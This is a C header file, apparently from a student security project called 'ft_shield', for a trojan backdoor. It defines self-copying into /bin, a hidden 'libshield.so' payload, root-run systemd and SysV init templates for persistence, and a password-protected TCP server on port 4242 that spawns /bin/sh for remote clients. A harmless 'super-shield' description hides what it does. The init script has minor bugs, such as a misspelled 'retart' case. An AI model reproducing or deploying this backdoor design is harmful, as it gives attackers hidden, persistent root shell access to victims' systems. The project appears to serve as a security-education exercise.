#ifndef FT_SHIELD_H
# define FT_SHIELD_H

# define _GNU_SOURCE
# include <elf.h>
# include <fcntl.h>
# include <libgen.h>
# include <sys/mman.h>
# include <netinet/in.h>
# include <signal.h>
# include <stdbool.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <sys/select.h>
# include <sys/socket.h>
# include <sys/stat.h>
# include <sys/wait.h>
# include <unistd.h>

# define STUDENT_LOGIN "lmartin"
# define PRG_NAME "ft_shield"
# define TARGET_LOCATION "/bin"
# define PROC_SELF_EXE "/proc/self/exe"

# ifdef PAYLOAD
#  define SNEAKY_FILE "libshield.so"
# endif

# define PROMPT "$> "

# define BIN_SHELL "/bin/sh"
# define READ_END 0
# define WRITE_END 1

# define BUFFER_SIZE 4096
# define MAX_PATH_SIZE 256

# define SERVER_PORT 4242
# define MAX_CLIENTS 3

typedef struct			s_client
{
	int					fd;
	bool				logged;
	int					fd_shell;
	pid_t				shell_pid;
	pid_t				output_pid;
	bool				shell;
}						t_client;

typedef struct			s_serv
{
	int					port;
	struct sockaddr_in	addr;
	int					sockfd;
	int					fd_max;
	fd_set				fd_read;
	fd_set				fd_master;
	t_client			clients[MAX_CLIENTS];
	int					nb_clients;
}						t_serv;

# ifndef HASHED_PWD
#  define HASHED_PWD "0315b4020af3eccab7706679580ac87a710d82970733b8719e70af9b57e7b9e6"
# endif

# define NB_CMDS 2
# define CMD				{"help", "shell"}
# define CMD_FUNC			{&show_help, &spawn_shell}

# define send_str(x,y) send(x, y, strlen(y), 0)

/* server.c */
void		remove_client(t_serv *serv, int fd);
void		server(void);

/* shell.c */
void		launch_command(t_serv *serv, int fd, char *cmd);

/* sha256.c */
char		*sha256(char *str, size_t size);

# define DESCRIPTION "Protect your OS with a super-shield"

# define SYSTEMD_CONF_DIR "/etc/systemd/system"
# define SYSTEMD_CONFIG "[Unit]\n\
Description=%s\n\
\n\
[Service]\n\
User=root\n\
WorkingDirectory=%s\n\
ExecStart=%s\n\
Restart=always\n\
\n\
[Install]\n\
WantedBy=multi-user.target\n"

# define SYSV_CONF_DIR "/etc/init.d"
# define SYSV_CONFIG "#!/bin/sh\n\
### BEGIN INIT INFO\n\
# Provides:          %s\n\
# Required-Start:    $local_fs $network $named $time $syslog\n\
# Required-Stop:     $local_fs $network $named $time $syslog\n\
# Default-Start:     2 3 4 5\n\
# Default-Stop:      0 1 6\n\
# Description:       %s\n\
### END INIT INFO\n\
\n\
SCRIPT=%s\n\
RUNAS=root\n\
\n\
PIDFILE=/var/run/%s.pid\n\
LOGFILE=/var/log/%s.log\n\
\n\
start() {\n\
  if [ -f /var/run/$PIDNAME ] && kill -0 $(cat /var/run/$PIDNAME); then\n\
    echo 'Service already running' >&2\n\
    return 1\n\
  fi\n\
  echo 'Starting service…' >&2\n\
  local CMD=\"$SCRIPT &> \\\"$LOGFILE\\\" & echo \\$!\"\n\
  su -c \"$CMD\" $RUNAS > \"$PIDFILE\"\n\
  echo 'Service started' >&2\n\
}\n\
\n\
stop() {\n\
  if [ ! -f \"$PIDFILE\" ] || ! kill -0 $(cat \"$PIDFILE\"); then\n\
    echo 'Service not running' >&2\n\
    return 1\n\
  fi\n\
  echo 'Stopping service…' >&2\n\
  kill -15 $(cat \"$PIDFILE\") && rm -f \"$PIDFILE\"\n\
  echo 'Service stopped' >&2\n\
}\n\
\n\
uninstall() {\n\
  echo -n \"Are you really sure you want to uninstall this service? That cannot be undone. [yes|No] \"\n\
  local SURE\n\
  read SURE\n\
  if [ \"$SURE\" = \"yes\" ]; then\n\
    stop\n\
    rm -f \"$PIDFILE\"\n\
    echo \"Notice: log file is not be removed: '$LOGFILE'\" >&2\n\
    update-rc.d -f <NAME> remove\n\
    rm -fv \"$0\"\n\
  fi\n\
}\n\
\n\
case \"$1\" in\n\
  start)\n\
    start\n\
    ;;\n\
  stop)\n\
    stop\n\
    ;;\n\
  uninstall)\n\
    uninstall\n\
    ;;\n\
  retart)\n\
    stop\n\
    start\n\
    ;;\n\
  *)\n\
    echo \"Usage: $0 {start|stop|restart|uninstall}\"\n\
esac\n"

#endif
